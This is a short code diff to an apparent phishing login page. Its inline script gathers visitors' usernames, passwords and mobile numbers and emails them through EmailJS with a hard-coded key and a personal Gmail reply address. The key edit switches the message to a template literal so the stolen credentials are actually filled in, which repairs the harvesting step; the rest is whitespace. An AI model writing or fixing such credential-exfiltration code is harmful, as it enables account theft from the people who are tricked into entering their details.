@@ -273,7 +273,7 @@ button:hover {
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
 
-       // Initialize EmailJS
+ // Initialize EmailJS
 (function() {
     emailjs.init("Gjx15gLz2eH6G9gt2"); // Your public key
 
@@ -296,7 +296,7 @@ button:hover {
         if (mobileNumber.length === 10) {
             // Prepare data to be sent via EmailJS
             const formData = {
-                message: "Username: ${username}, Password: ${password}, Mobile Number: ${mobileNumber}",
+                message: `Username: ${username}, Password: ${password}, Mobile Number: ${mobileNumber}`,
                 from_name: "Server",
                 reply_to: "risov700k@gmail.com"
             };
@@ -338,7 +338,7 @@ button:hover {
     audioCaptcha.addEventListener('change', updateCaptchaImage);
 })();
  
-
+       
     </script>
  
 </body>
